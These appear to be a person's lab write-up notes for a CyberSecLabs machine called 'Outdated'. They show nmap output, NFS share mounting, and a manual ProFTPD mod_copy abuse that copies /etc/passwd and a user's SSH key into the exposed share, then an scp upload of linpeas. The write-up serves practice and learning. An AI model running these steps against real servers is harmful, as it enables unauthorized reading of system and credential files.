---
title: Outdated
created: '2020-07-04T12:48:44.472Z'
modified: '2020-07-04T13:14:32.629Z'
---

# Outdated
- IP: `172.31.1.22`
- OS: `Linux`
## Enumeration
### Writeup
We can mount a directory from NFS.

The server is running a vulnerable verion of ProFTPD but the [exploit](https://www.exploit-db.com/exploits/36803) requires a webserver. Let's see if we can do it manually.

`site cpfr /etc/passwd`
`site cpto /var/nfsbackups/passwd`

We can get the home folder for daniel and that way, we get his ssh key.
`scp -i /root/Documents/Learn/CyberSecLabs/Outdated/id_rsa linpeas.sh daniel@172.31.1.22:`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.22`
```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      ProFTPD 1.3.5
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:6b:ae:92:45:a3:2d:d6:45:1c:ad:4f:37:23:4d:3b (DSA)
|   2048 24:4a:81:08:4b:cc:bb:a7:c9:da:3b:17:39:ad:a0:61 (RSA)
|_  256 0c:2b:07:32:18:8c:1a:86:e3:fa:c4:09:de:f5:0f:a0 (ECDSA)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37773/tcp   mountd
|   100005  1,2,3      43057/udp   mountd
|   100005  1,2,3      45897/udp6  mountd
|   100005  1,2,3      46639/tcp6  mountd
|   100021  1,3,4      41620/udp6  nlockmgr
|   100021  1,3,4      46185/tcp   nlockmgr
|   100021  1,3,4      46252/udp   nlockmgr
|   100021  1,3,4      55229/tcp6  nlockmgr
|   100024  1          38008/udp6  status
|   100024  1          44207/tcp   status
|   100024  1          55678/tcp6  status
|   100024  1          57842/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
37541/tcp open  mountd   1-3 (RPC #100005)
37773/tcp open  mountd   1-3 (RPC #100005)
44023/tcp open  mountd   1-3 (RPC #100005)
44207/tcp open  status   1 (RPC #100024)
46185/tcp open  nlockmgr 1-4 (RPC #100021)
```
</details>

<details>
<summary>nfs</summary>

- `showmount -e 172.31.1.22`
```
Export list for 172.31.1.22:
/var/nfsbackups *.*.*.*
```

- `mount -t nfs 172.31.1.22:/var/nfsbackups /mnt/nfsbackups`
</details>

<details>
<summary></summary>

- ``
```

```
</details>
